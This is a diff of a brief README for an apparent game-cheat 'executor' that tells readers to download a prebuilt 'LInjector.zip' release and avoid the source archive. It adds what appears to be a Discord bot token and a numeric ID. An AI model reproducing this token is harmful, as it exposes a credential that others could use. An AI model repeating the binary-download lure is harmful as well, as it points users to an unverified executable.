@@ -1,2 +1,4 @@
 # Executer
 Click "Release" to download, IMPORTANT: PRESS "LInjector.zip" (Highlighted in blue). DON'T USE THE DOWNLOAD BUTTON AT THE BOTTOM (Source code (zip), IT WILL MESS UP THE INSTALLATION PROCESS.
+5Nzg3OTA0OTI4NTAxNzY5MA.GqIIqE.pisvq3r6semebZUPNWZQhzOhy_EY4ErGttWOWI
+1197879274783383613
